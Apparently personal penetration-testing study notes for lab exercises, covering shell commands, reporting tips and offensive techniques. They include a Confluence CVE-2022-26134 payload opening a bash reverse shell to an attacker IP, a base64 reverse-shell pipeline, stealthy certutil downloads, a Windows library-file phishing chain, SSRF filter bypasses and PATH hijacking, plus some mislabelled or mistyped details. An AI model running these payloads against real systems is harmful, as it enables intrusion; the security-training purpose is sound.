## Generic Notes

Whether you think you can or think you can’t, you’re right."


### Technical Procedures and Commands

1. **Accessing Module Exercise VMs via SSH**:
   ```bash
   ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@191.168.50.52
   ```

2. **Addressing File Execution Permission Issues**:
   - If lacking execution permissions, copy the file to a location where execution is permitted.

---

### Networking and IP Addressing

- Use the format `193.168.{third octet of TUN0 network interface}.{specific octet associated with the machine}` for specific network addressing.

---

### Penetration Testing Methodologies

1. **OWASP Penetrating Testing Execution Standard**:
   - Pre-engagement Interactions.
   - Intelligence Gathering.
   - Threat Modeling.
   - Vulnerability Analysis.
   - Exploitation.
   - Post Exploitation.
   - Reporting.

---

### Effective Note-taking and Report Writing

1. **General Guidelines**:
   - Understand the scope.
   - Document the Rules of Engagement.
   - Ensure clarity and precision.
   - Make notes easily understandable and repeatable.
   - Use cloud storage for portability.
   - Include every relevant command.
   - Discard unhelpful notes.
   - Recommended tools: Sublime, CherryTree, Obsidian.

2. **Documenting Web Application Vulnerabilities**:
   - Application Name, URL, Request Type, Issue Detail, Proof of Concept Payload.

3. **Characteristics of Good and Bad Screenshots**:
   - Good: Legible, relevant to the client, supports description, properly frames the material.
   - Bad: Illegible, generic, contains irrelevant information, poorly framed.

---

#### Processes

To filter processes to find the processes you'd like:
```bash
ps aux | grep process_name
```
Aux argument will provide all processes, and ping to grep filters.

---

#### Adding Repositories

Sources are stored in /etc/apt/sources.list. Let's say that a package isn't found, so you can't install new binaries or packages, you're likely missing the source location in which the binary or package is held. Modify the provided file to include the source you need.

#### sed

Stream editor.

```bash
sed s/mysql/MySQL/g /etc/snort/snort.conf > snort2.conf
```
Find all of the occurences of 'mysql' (s/mysql), and replace them with 'MySQL globally' (/MySQL/g) in the file '/etc/snort/snort.conf', and sent the output to 'snort2.conf'

---

#### strings

Pull the strings out of any file.

#### Changing MAC Address

```bash
sudo ifconfig eth0 down
sudo ifconfig eth0 hw ether 00:00:00:11:11:11
sudo ifconfig eth0 up
```

#### Obsidian 

Obsidian stores information in a Vault, which is a folder on our system. We can create both markdown files and folders within the Vault. Obsidian's features include a live preview of markdown text, in-line image placement, code blocks, and a multitude of add-ons such as a community-built CSS extension.

An Obsidian vault can be relocated to another computer and opened from the Welcome menu. Markdown files can simply be dropped into the Vault folders, which will automatically be recognized by Obsidian.

The use of markdown means that we can provide syntax and formatting that is easily copied to most report generation tools, and a PDF can be generated straight from Obsidian itself.

Installing:

```bash
wget https://github.com/obsidianmd/obsidian-releases/releases/download/v0.14.2/Obsidian-0.14.2.AppImage
chmod +x Obsidian-0.14.2.AppImage
./Obsidian-0.`14.2.AppImage
```

Some additional cool tools are located in 'https://github.com/nil0x42/awesome-hacker-note-taking'.

#### Python HTTP Server

```bash
python -m SimpleHTTPServer 80
```
#### PenTestMonkey

Great tool of cheat sheets: `https://pentestmonkey.net/cheat-sheet/shells/reverse-cheat-sheet`


### Abusing Windows Library Files

Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a .Library-ms file extension and can be executed by double-clicking them in Windows Explorer.

First, we'll create a Windows library file connecting to a WebDAV share we'll set up. In the first stage, the victim receives a .Library-ms file, perhaps via email. When they double-click the file, it will appear as a regular directory in Windows Explorer. In the WebDAV directory, we'll provide a payload in the form of a .lnk shortcut file for the second stage to execute a PowerShell reverse shell. We must convince the user to double-click our .lnk payload file to execute it.

When they double-click the file, Windows Explorer displays the contents of the remote location as if it were a local directory. In this case, the remote location is a WebDAV share on our attack machine. Overall, this is a relatively straightforward process and makes it seem as if the user is double-clicking a local file.

We'll run WsgiDAV from the /home/kali/.local/bin directory. The first parameter we'll provide is --host, which specifies the host to serve from. We'll listen on all interfaces with 0.0.0.0. Next, we'll specify the listening port with --port=80 and disable authentication to our share with --auth=anonymous. Finally, we'll set the root of the directory of our WebDAV share with --root /home/kali/webdav/.

```bash
kali@kali:~$ mkdir /home/kali/webdav

kali@kali:~$ touch /home/kali/webdav/test.txt

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
Running without configuration file.
17:41:53.917 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
17:41:53.919 - INFO    : WsgiDAV/4.0.1 Python/3.9.10 Linux-5.15.0-kali3-amd64-x86_64-with-glibc2.33
17:41:53.919 - INFO    : Lock manager:      LockManager(LockStorageDict)
17:41:53.919 - INFO    : Property manager:  None
17:41:53.919 - INFO    : Domain controller: SimpleDomainController()
17:41:53.919 - INFO    : Registered DAV providers by route:
17:41:53.919 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.9/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
17:41:53.919 - INFO    :   - '/': FilesystemProvider for path '/home/kali/webdav' (Read-Write) (anonymous)
17:41:53.920 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
17:41:53.920 - WARNING : Share '/' will allow anonymous write access.
17:41:53.920 - WARNING : Share '/:dir_browser' will allow anonymous read access.
17:41:54.348 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.5.2+ds1 Python 3.9.10
17:41:54.348 - INFO    : Serving on http://0.0.0.0:80 ..
```

You can check that it's running by going to 'http://127.0.0.1' in your browser.

#### Find Files Owned by Particular User (or Group)

```bash
find / -user admin 2</dev/null
```

#### Test Ping Against Yourself

Local.
```
sudo tcpdump -i tun0 icmp -n -v
```

Remote.
```
ping -c 1 {ip address}
```

#### Test for RCE

A great way to test for remote code execution is by using 'sleep {number}', and seeing if the request time increases by that number. This can be easily tested in BurpSuite.

#### Reverse Shell (NoHup)

It's good practice to use 'nohup' when you're doing a reverse shell so that it doesn't hang. If workers={currently maxed out}, then you won't be able to create your own thread. - IppSec HTB Mentor

#### Session Cookie

Your session cookie may be JSON in base64.. decode to see how you can manipulate your status.

#### Logging In to Apps

Intercept with BurpSuite, see if you can modify headers for mass assignment, LFI, RFI, RCE.

#### Version Identified
 
Proceed to check ExploitDB and Google for any public vulnerabilities.

#### Login Screen

Google what the default credentials are for that app and try those.

#### Additional Practice 

TJ_Null's OSCP-like box list.

#### Search Known Hashes

- Go to hashes.org.

#### Crack SSH Login

- Use Medusa if you want to check a known list of potential usernames and passwords.
- Use SHCrack if you want to check a password list for a specified user.. can put into a loop for multiple users.

#### Fuzzing APIs

When fuzzing APIs, try to fuzz in special characters ("/opt/SecLists/Fuzzing/special-characters.txt") and monitor for different responses. You can do this recursively. Find out if you can close out a command so you can inject new code. Note: You have to escape special characters in FUFF:
```bash
fuff -u 123.123.123.123/weather/forecast?city=\'FUZZ-- -w /opt/SecLists/Fuzzing/special-characters.txt -mc 200,500 -fw 9
```

#### Special Characters in SQL

If you run into special characters in a database that you need to extract, convert into Base64 with a command like:
```bash
select TO_BASE64(password) from accounts where id = 1;
```

#### Path Injection

If you have sudo permissions on a file (can be found with 'sudo -l'), and the file uses a command, such as 'gzip', you can modify the environment path in order to get your own file to run as 'gzip'. Simply create a bash file called 'gzip' and insert your current working directory into the first position in the path variable.

#### Mounting SMB Shares

Instead of enumerating Windows shares with smbclient, you can mount shares on your local filesystem and enumerate in a familiar environment.
```bash
sudo mkdir /mnt/data
sudo mount -t cifs //123.123.123.123/Data /mnt/data
```

Note that Windows likes to store some files in UTF-16LE, while Linux likes UTF8. If you run into this problem, you'll need to convert in order to cat the files.

```bash
cat file | iconv -f UTF-16LE -t utf8
```

#### URL Directory Without Slash

Try searching for URL directories without the slash (e.g. 'http://website.com/upload'), and if the url is automatically updated to 'http://website.com/upload/', then there's some sort of logic going on, and the directory probably exists, even if it says "Not Found" or something along those lines.

#### IP Address Blocked

If for whatever reason (such as doing a SSRF) 127.0.0.1 & localhost (or any other IPs) are blocked, you may be able to get around this by representing the IP in hex form, '0x7f000001', in order to bypass this.

#### Version Exposed

When a version for ANYTHING is exposed or uncovered, DO NOT SKIP OVER THIS and search the web for public exploits. This will be a part of your process.

#### Windows' Curl

Stay under the radar and use certutil.exe on Windows to download files from the internet:
```bash
certutil.exe -f -urlcache http://123.123.123.123/winPEASx64.exe winpeas.exe
```

#### Unzipping Files

```bash
unzip file.zip
7z x file.zip
tar -xzvf file.tar.gz
sudo gzip -d rockyou.txt.gz
```

#### PyInstaller

If Python is not installed on a target system, and you don't know how to write C code for the function that you want to do, you can use PyInstaller in order to turn a Python script into an executable that can be run on the target system.

#### Cross-Compiling Code

If you need to compile code for a Windows exploit, and the only machine that you have access to is your Kali machine, you can use **mingw-w64** to compile the code into a Windows Portable Executable (PE) file.
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe

# Google the error if it doesn't work, in this case, modify as follows
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

#### AntiScan.me

This service scans our sample against 30 different AV engines and claims to not divulge any submitted sample to third-parties.

#### Bind Shells

Be aware of this method of access, it is convinient. 

#### Cool *ls* Commands

```bash
# Extensive command that is all you could as for, consider making an alias
ls -lsaht
# Both of these recursively show you the subdirectories and files within
tree .
ls -lsaR
```

#### Crackstation.net

Instead of manual cracking with hashcat or JTR, you can put the hash into "https://crackstation.net" instead. According to S1REN (OffSec employee), it's akin to running the rockyou.txt wordlist with hashcat & JTR.

#### Note When Encoding Payload

Whenever encoding and decoding a reverse shell in base 64, remove the special characters like + and = because they often cause errors. Simply insert extra spaces where necessary. 

#### No Spaces in Payload Work-Around

```bash
{echo,-n,**base64 encoded reverse bash shell**}|{base64,-d}|bash
```

This can overcome rules that don’t allow for spaces. 

#### Login Forms

When you run into login forms, think SQLi, Code injection, error-message username enumeration, search default credentials, brute-forcing with hydra/wfuzz, search web for exploits, SSTIs, custom wordlists with cewl.

#### Once Logged In

Assess the functionality provided to us and see if we can abuse it.

Look for service versions (exploit-db), abusing file-upload vulnerability, user privileges may be able to be changed, code execution directly in a new post/page, look for modules, extensions & addons or create your own with backdoors, look for a downgrade attack on the target machine/cms, edit some pre-existing extension or functionality to plant executable code, look for interesting data, credentials

#### Using Public Exploits

It's important to at least psyeudo understand the payload that you are using, if nothing else, to make sure that it works on your end. For example, CVE-2022-26134 for Confluence uses the following payload:

```bash
curl -v http://192.168.235.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.213/1271%200%3E%261%27%29.start%28%29%22%29%7D/
```

If you didn't study the payload, you wouldn't see the there are certain characters in the payload that *aren't* url endcoded. These characters are like this for a reason. You can extrapolate to many other payloads. 

#### Find and Kill Process Running on a Port

```bash
sudo lsof -i :2345
kill -9 <PID>
```

#### Is the Computer Connected to Other Internal Computers?

When looking at the output from ifconfig, ipconfig, or ip addr, see if there is more than one network interface (other than the loopback). If there is, that is very interesting, and you should enumerate, if not, just focus on the computer itself. The target machine below is not connected to the internal network and we cannot use it as a pivot point.

```bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:26:5d brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.50.244/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:265d/64 scope link 
       valid_lft forever preferred_lft forever
```

#### What to do with SMB

If you have access to SMB shares, your options are to enumerate the shares for valuable information, and to craft 

#### When you See Input Section on Website

Try to set up a quick python server and make a get request with HTML:

```html
 <body>                                                                         
     <a href="http://192.168.192.121:8000/your-endpoint">Send GET Request</a>         
 </body>
 ```

 #### How to tell if you're dealing with Powershell or CMD

 ```bash
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```

 #### PHPINFO - What to Look For

 Look for the document root, as it will tell you the directory the website is working out of. Also, look at "disable_functions" as it will tell you what functions you're allowed to run in PHP.

 #### Mark Yourself as the Owner of Current Directory

 This is more for ease of use, when you know that the files in this directory could be compromised without you worrying. 

 ```bash
 sudo chown -R username:username ./
 ```


#### Probably the best Cheat Sheet I've Found

"https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/sql/" 